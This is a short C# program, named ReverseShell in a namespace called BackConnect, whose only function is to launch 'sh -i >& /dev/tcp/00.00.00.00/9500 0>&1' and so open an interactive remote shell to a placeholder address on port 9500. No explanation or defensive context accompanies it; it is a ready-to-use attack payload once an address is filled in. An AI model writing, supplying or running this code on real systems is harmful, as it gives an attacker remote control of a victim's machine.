using System;
using System.Diagnostics;

namespace BackConnect {
  class ReverseShell {
	public static void Main(string[] args) {
	  Process proc = new System.Diagnostics.Process();
  	  proc.StartInfo.FileName = "sh";
  	  proc.StartInfo.Arguments = "-c \"sh -i >& /dev/tcp/00.00.00.00/9500 0>&1\"";
  	  proc.StartInfo.UseShellExecute = false;
  	  proc.StartInfo.RedirectStandardOutput = true;
  	  proc.Start();

	  while (!proc.StandardOutput.EndOfStream) {
		Console.WriteLine(proc.StandardOutput.ReadLine());
	  }
	}
  }
}

